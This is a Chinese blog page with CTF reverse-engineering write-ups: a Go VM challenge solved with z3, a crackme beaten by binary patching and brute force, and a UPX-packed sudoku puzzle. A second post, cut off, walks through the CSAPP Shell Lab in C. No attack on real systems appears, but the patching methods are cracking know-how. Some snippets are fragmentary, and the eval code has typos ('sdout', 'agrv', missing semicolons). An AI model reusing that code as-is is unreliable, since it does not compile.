<p><img src="https://i.bmp.ovh/imgs/2022/08/08/be41905303bfdecf.png" alt="main"></p>
<p>gocode提示了这是go语言写的，所以搜索函数main_main找到主函数，通过右上角的图可知输入总长度为37，且是由 PCL{} 括起来的；</p>
<p>看到while（1）和switch 再根据题目名称，可知道这是个类似VM的东西，而根据docode变量可知第一站经过的便是右下角图中的函数，作用是把flag括起来的32个长度内容两两拼接成十六进制数，一共变成16个；</p>
<p>然后便是对不同指令码对应操作进行翻译：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/08/7d5ef9ba61931d33.png" alt="do"></p>
<p>逻辑就是每次经过AA开始判断，如果错误就退出程序，直到走完全部的code码就算成功；</p>
<p>把翻译的写成代码然后用z3来解：(重要代码)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%d]&#x27;</span> % i,<span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">    <span class="keyword">global</span> ip</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    <span class="keyword">global</span> ex</span><br><span class="line">    <span class="keyword">if</span> ip + <span class="number">2</span> &gt;= <span class="number">374</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ip out of range&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    s.add(ex[code[ip+<span class="number">1</span>]] == ex[code[ip+<span class="number">2</span>]])</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ip &gt;= <span class="number">374</span>:</span><br><span class="line">        <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">            <span class="built_in">print</span>(s.model())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>解出数字后换成十六进制再拼写在一起便得到：<strong>PCL{bdcc4f46d73ec09ee628633d2f227b47}</strong></p>
<h2 id="5-analgo"><a href="#5-analgo" class="headerlink" title="5.analgo"></a>5.analgo</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/10/e9e40cfe728b32f2.png" alt="main"></p>
<p>第一眼看去会和上道题很像，也是类似虚拟机的构造，v23是指令，main_anal函数是虚拟机函数，下面的十六进制数是比较数据，判断输入的长度是42；</p>
<p>但是由于这个VM反编译出很多控制数不好分析各个指令码在做什么，同时发现输入是包含flag{}的，且每输入一个，比较结果也对应的变换一个，称之为一一对应；(蓝线是对应关系)</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/10/aa4c8dee1829543b.png" alt="company"></p>
<p>可以看到随着 flag{ 的输入，每输入一个，RCX 和 RDX 就相同一个字节；</p>
<p>那么可以使用之前hgame中 hardasm 题目的解法，将加密后的RCX值输出，与比较数据判断从而爆破；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/10/802a1bcea8cfff64.png" alt="patch0"></p>
<p>先把判断搞掉，全nop，直接进入输出 wrong（SecondBC） 的地方；之后修改原程序比较的地方，改为将加密数据放到 SecondBC 这个地方：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/10/57ca9cd0558166a6.png" alt="patch1"></p>
<p>但因为 SecondBC 是 rdata段的，拥有只读权限，所以要修改权限：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/10/fb73adfe949db76d.png" alt="change"></p>
<p>搜索 .rdata，将 40 00 00 40 改为 40 00 00 C0； </p>
<p>之后写代码爆破：（使用subprocess模组）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">ans = <span class="string">&#x27;this is answer&#x27;</span>        <span class="string">&#x27;&#x27;&#x27;比较数据&#x27;&#x27;&#x27;</span></span><br><span class="line">hexs = <span class="string">&#x27;0123456789abcdef-&#x27;</span>		<span class="string">&#x27;&#x27;&#x27;约束范围，输入其他的程序会提前退出&#x27;&#x27;&#x27;</span></span><br><span class="line">hexs = <span class="built_in">list</span>(hexs)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    hexs[i] = <span class="built_in">ord</span>(hexs[i])</span><br><span class="line"></span><br><span class="line">real_flag=<span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">cur_index = <span class="number">5</span>		<span class="string">&#x27;&#x27;&#x27;当前位置&#x27;&#x27;&#x27;</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> cur_index &lt; <span class="number">42</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> hexs:				</span><br><span class="line">        real_flag_arr = [<span class="number">0</span>] * <span class="number">42</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(real_flag)):					<span class="string">&#x27;&#x27;&#x27;爆破储存位置&#x27;&#x27;&#x27;</span></span><br><span class="line">            real_flag_arr[j] = <span class="built_in">ord</span>(real_flag[j])</span><br><span class="line">        real_flag_arr[<span class="built_in">len</span>(real_flag_arr)-<span class="number">1</span>] = <span class="built_in">ord</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(real_flag_arr)-<span class="number">2</span>,cur_index,-<span class="number">1</span>):</span><br><span class="line">            real_flag_arr[j] = <span class="number">48</span>				<span class="string">&#x27;&#x27;&#x27;未知位填充0&#x27;&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        real_flag_arr[cur_index] = i</span><br><span class="line">        real_flag_arr_s = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> real_flag_arr)</span><br><span class="line">        p = subprocess.Popen([<span class="string">&quot;C:\\Users\\Second_BC\\Desktop\\analgo.exe&quot;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">        p.stdin.write(real_flag_arr_s.encode())		<span class="string">&#x27;&#x27;&#x27;输入程序&#x27;&#x27;&#x27;</span></span><br><span class="line">        p.stdin.close()</span><br><span class="line">        out = p.stdout.read()		<span class="string">&#x27;&#x27;&#x27;读取输出&#x27;&#x27;&#x27;</span></span><br><span class="line">        out = <span class="built_in">list</span>(out)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out[k] == ans[k] ):</span><br><span class="line">            real_flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            cur_index += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(real_flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>由于这个程序是 8字节 8字节来比较的，所以手动多调几次，传入之前先 add rsi 8 获取之后的加密数据；</p>
<p>然后每轮都改下cur_index += 8；</p>
<p>然后得到：<strong>flag{568a3cdd-77e1-4c42-9fee-127e27a5744e}</strong></p>
<h2 id="6-puzzle"><a href="#6-puzzle" class="headerlink" title="6.puzzle"></a>6.puzzle</h2><p>一开始发现是个加壳程序，跑一遍发现和UPX加壳很像，一开始是循环解码，然后进入原入口；用PE也显示其为UPX加壳，但是提示不能用指令脱壳；</p>
<p>使用十六进制查看器发现原UPX标记处被改为了vmp，将其改回并用指令对其脱壳；</p>
<p><img src="https://s2.loli.net/2022/08/18/iNmo4yPxY3CDvdu.png" alt="unpack"></p>
<p>之后进去过后看IDA：</p>
<p><img src="https://s2.loli.net/2022/08/18/QlHr3EZWxiqSUIa.png" alt="main"></p>
<p>在scanf之后的是一段循环，通过调试可以知道，这里允许通过 0 ~ 9 字符，并且一共输入56个，否则失败；</p>
<p>这段循环将输入的56个数字放到一些地址里，而地址原来就有些数据；填完之后一共是 9*9 = 81个数据；</p>
<p>然后来到判断 judge 函数，这里它将这81个内容作为参数传入；</p>
<p>经过调试呢，可以发现，输入的内容中，有些是不能重复的，而且不能有 0 ；这可以让想起数独游戏；</p>
<p>把里面给的数据拿出来做成 9 * 9 的数独表，然后进行求解：</p>
<p><img src="https://s2.loli.net/2022/08/18/QNplakuqID2Zjdi.png" alt="solve"></p>
<p>解出输入的56个内容为：<strong>76135283549798674164925733849217386455934161872359295314</strong></p>
<p>输入源程序之后，便得到： <strong>flag{23c3cb3aedbbfdd009d1bf52e530676a}</strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://secondbc.github.io/SecondBC/2022/08/18/%E5%81%87%E6%9C%9F%E5%A4%8D%E7%8E%B0/" data-id="cl6z7512400007cvc3jy3hpx4" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Shell-Lab" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/SecondBC/2022/04/23/Shell-Lab/" class="article-date">
  <time datetime="2022-04-23T08:23:15.000Z" itemprop="datePublished">2022-04-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/SecondBC/2022/04/23/Shell-Lab/">Shell_Lab</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>壳实验，对应于csapp第8章，异常控制流；根据其提示可知，该实验要求编写一个完整的简单的壳；</p>
<p>在完成之后，有许多的检测关卡等待壳的成果；</p>
<p>实际上，此实验已经将大部分内容编写完毕，只要求完成7个函数的构造来完整壳即可；</p>
<p>这7个函数都是有关于信号，以及异常处理的；</p>
<h2 id="现在来先说说这7个函数的大致功能以及目的："><a href="#现在来先说说这7个函数的大致功能以及目的：" class="headerlink" title="现在来先说说这7个函数的大致功能以及目的："></a>现在来先说说这7个函数的大致功能以及目的：</h2><ol>
<li><p>eval：解析和解释命令行的主例程；</p>
</li>
<li><p>builtin_cmd：识别并解释内置命令；</p>
<ul>
<li><p>内置命令：</p>
</li>
<li><p>quit：退出shell；</p>
</li>
<li><p>fg：发送 SIGCONT（继续）来重启 job，位于前台运行；（前台只允许1个job运行）</p>
</li>
<li><p>bg：发送 SIGCONT（继续）来重启 job，位于后台运行；</p>
</li>
<li><p>jobs：列出所有后台作业；</p>
</li>
</ul>
</li>
<li><p>do_bgfg：执行bg和fg指令；</p>
</li>
<li><p>waitfg：等待前台作业完成；</p>
</li>
<li><p>sigchld_handler：SIGCHLD（子程序退出）信号处理；</p>
</li>
<li><p>sigint_handler：SIGINT（中断）信号处理；</p>
</li>
<li><p>sigtstp_handler：SIGTSTP（暂停）信号处理；</p>
</li>
</ol>
<h2 id="辅助的已有函数："><a href="#辅助的已有函数：" class="headerlink" title="辅助的已有函数："></a>辅助的已有函数：</h2><ul>
<li>parseline：解析命令行构建argv列表；</li>
<li>clearjob：清除job结构体中的内容；</li>
<li>initjobs：初始化job列表；</li>
<li>maxjid：返回允许的最大job ID；</li>
<li>addjob：添加一个作业到job列表；</li>
<li>deletejob：从job列表中删除pid的作业；</li>
<li>fgpid：返回前台job的pid；</li>
<li>getjobpid：根据pid从job列表中找到作业；</li>
<li>getjobjid：根据job ID从job列表中找到作业；</li>
<li>pid2jid：根据pid返回对应jid；</li>
<li>listjobs：显示job列表；</li>
</ul>
<h2 id="之后有经典的实验约束规则："><a href="#之后有经典的实验约束规则：" class="headerlink" title="之后有经典的实验约束规则："></a>之后有经典的实验约束规则：</h2><ul>
<li>提示符为：tsh&gt;</li>
<li>用户键入的命令行应包含一个名称和零个或多个参数，所有参数均由一个或多个空格分隔。 如果名称是内置命令，则shell应该立即处理它并等待下一个命令行；否则，shell应该假定名称是可执行文件的路径，它在初始子进程的上下文中加载并运行；</li>
<li>shell不用支持管道或I/O重定向；</li>
<li>输入 ctrl-c 导致 SIGINT （输入 ctrl-z 导致 SIGTSTP）发送到当前前台作业以及该作业的任何后代，如果没有前台作业，那么信号没有效果；</li>
<li>如果命令行以 &amp; 结束，则shell应该在后台运行作业，否则它将在前台运行该作业；</li>
<li>每个作业都可以通过进程ID（PID）或作业ID（JID）进行标识，该ID是tsh分配的正整数；</li>
<li>shell支持内置命令；</li>
<li>shell应该回收所有僵死子进程，如果任何作业由于接收到未捕获到的信号而终止，则shell应该识别此事件并打印一条消息，其中包含该作业的PID和有问题的信号的描述；</li>
</ul>
<h2 id="先来看Shell的主函数："><a href="#先来看Shell的主函数：" class="headerlink" title="先来看Shell的主函数："></a>先来看Shell的主函数：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> emit_prompt = <span class="number">1</span>; <span class="comment">/* emit prompt (default) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Redirect stderr to stdout (so that driver will get all output</span></span><br><span class="line"><span class="comment">     * on the pipe connected to stdout) */</span></span><br><span class="line">    dup2(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the command line */</span></span><br><span class="line">    <span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">&quot;hvp&quot;</span>)) != EOF) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:             <span class="comment">/* print help message */</span></span><br><span class="line">            usage();</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:             <span class="comment">/* emit additional diagnostic info */</span></span><br><span class="line">            verbose = <span class="number">1</span>;</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:             <span class="comment">/* don&#x27;t print a prompt */</span></span><br><span class="line">            emit_prompt = <span class="number">0</span>;  <span class="comment">/* handy for automatic testing */</span></span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">            usage();</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Install the signal handlers */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* These are the ones you will need to implement */</span></span><br><span class="line">    Signal(SIGINT,  sigint_handler);   <span class="comment">/* ctrl-c */</span></span><br><span class="line">    Signal(SIGTSTP, sigtstp_handler);  <span class="comment">/* ctrl-z */</span></span><br><span class="line">    Signal(SIGCHLD, sigchld_handler);  <span class="comment">/* Terminated or stopped child */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This one provides a clean way to kill the shell */</span></span><br><span class="line">    Signal(SIGQUIT, sigquit_handler); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the job list */</span></span><br><span class="line">    initjobs(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Execute the shell&#x27;s read/eval loop */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Read command line */</span></span><br><span class="line">	<span class="keyword">if</span> (emit_prompt) &#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">	    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &amp;&amp; ferror(<span class="built_in">stdin</span>))</span><br><span class="line">	    app_error(<span class="string">&quot;fgets error&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (feof(<span class="built_in">stdin</span>)) &#123; <span class="comment">/* End of file (ctrl-d) */</span></span><br><span class="line">	    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Evaluate the command line */</span></span><br><span class="line">	eval(cmdline);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* control never reaches here */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个while是在选择模式；输入h参数显示提示，输入v参数发出附加诊断信息，输入p不显示命令行；</p>
<p>之后需要捕获信号，就需要通过Signal函数将信号和对应处理函数绑定，然后进入第二个while使用eval一条一条地重复解析输入的内容；</p>
<h2 id="I-Eval"><a href="#I-Eval" class="headerlink" title="I . Eval"></a>I . Eval</h2><p>第一解析命令行，可以套用parseline函数来帮忙，并根据结尾符号是否为 &amp; 来判断前后台关系；</p>
<p>第二要做到的，查看解析出的 argv[0] 是否为内置命令，是，则转交给builtin_cmd函数，不是则创建子进程来运行；之后在shell中通过 addjob 来添加作业，如果是前台作业，就等待前台作业运行完毕，如果是后台作业，就执行解析下一条命令；</p>
<p>由此：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> <span class="built_in">array</span>[MAXLINE];</span><br><span class="line">	<span class="keyword">char</span> *buf = <span class="built_in">array</span>;		<span class="comment">//cmdline容器 </span></span><br><span class="line">	<span class="keyword">char</span> *argv[MAXARGS];	<span class="comment">//命令行参数 </span></span><br><span class="line">	<span class="keyword">int</span> bg;		<span class="comment">//前后台？ </span></span><br><span class="line">	<span class="keyword">pid_t</span> pid;		<span class="comment">//进程id </span></span><br><span class="line">	<span class="keyword">sigset_t</span> mask, prev, all;	<span class="comment">//阻塞块 </span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">strcpy</span>(buf,cmdline);</span><br><span class="line">	bg = parseline(buf,argv);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">if</span>(!builtin_cmd(argv))	<span class="comment">//是否内置命令 </span></span><br><span class="line">	&#123;</span><br><span class="line">		sigemptyset(&amp;mask);		<span class="comment">//清空mask块 </span></span><br><span class="line">		sigaddset(&amp;mask,SIGCHLD);	<span class="comment">//添加SIGCHLD到mask </span></span><br><span class="line">		sigfillset(&amp;all);	<span class="comment">//所有信号进入all块 </span></span><br><span class="line">		sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev)	<span class="comment">//阻塞SIGCHLD信号，防止addjob和deletejob竞争</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>((pid = fork()) == <span class="number">0</span>)	<span class="comment">//子进程 </span></span><br><span class="line">		&#123;</span><br><span class="line">			fflush(sdout);	<span class="comment">//printf(&quot;in process:%d\n&quot;,pid);</span></span><br><span class="line">			setpgid(<span class="number">0</span>,<span class="number">0</span>); <span class="comment">//更换子进程进程组，以免和shell冲突</span></span><br><span class="line">			sigprocmask(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">if</span>(execve(argv[<span class="number">0</span>],agrv,environ) &lt; <span class="number">0</span>)	<span class="comment">//通过execve加载到子进程</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">			&#125; </span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//printf(&quot;parent:%d\n&quot;,getpid());</span></span><br><span class="line">		sigprocmask(SIG_BLOCK,&amp;all,<span class="literal">NULL</span>) <span class="comment">//访问job列表需阻塞所有信号 </span></span><br><span class="line">		addjob(jobs,pid,bg?BG:FG,buf);</span><br><span class="line">		sigprocmask(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>)	<span class="comment">//解除阻塞</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(bg)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, buf);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			waitfg(pid);	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的有两点：</p>
<ul>
<li>阻塞SIGCHLD信号以防止addjob与deletejob竞争；</li>
<li>访问全局数据jobs列表前阻塞所有信号；</li>
</ul>
<p>为什么要在fork创建进程之前阻塞SIGCHLD呢？因为fork的进程可能在任意时刻暂停或终止；使得Shell跳转通过对应信号去处理程序，并在信号处理中对该作业进行修改；如果在 addjob 之前跳转，则会由于未保存该作业而导致错误，所以需要在fork之前阻塞，并在子进程中取消阻塞；</p>
<p>设置独立的进程组与Shell分开，以免Shell接收到的其他例如 ctrl-c 之类的信号而导致进程受到影响；</p>
<p>其次，从安全信号处理的角度，在修改读取jobs时如果不阻塞所有信号，则会有可能中断而导致jobs的各部分状态不同；</p>
<h2 id="II-builtin-cmd"><a href="#II-builtin-cmd" class="headerlink" title="II . builtin_cmd"></a>II . builtin_cmd</h2><p>第一，前面可以知道用这个函数套用在eval里，使得分辨是否为内置命令，所以让内置命令返回1，而非内置命令返回0；</p>
<p>第二，已知这个函数会用于bg和fg的内置命令，所以可以套用do_bgfg的函数；</p>
<p>那么代码就可知了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;quit&quot;</span>))</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;jobs&quot;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		listjobs(jobs);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;&amp;&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>((!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;bg&quot;</span>)) || (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;fg&quot;</span>)))</span><br><span class="line">	&#123;</span><br><span class="line">		do_bgfg(argv);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="III-do-bgfg"><a href="#III-do-bgfg" class="headerlink" title="III . do_bgfg"></a>III . do_bgfg</h2><p>根据之前提到的，需要用用到SIGCONT信号，那么也需要使用kill来发送给整个进程组；</p>
<p>在这之前需要修改job结构的状态；</p>
<p>而在修改前台或者后台的再之前，需要寻找到这个工作的ID或者pid；</p>
<p>由此代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span 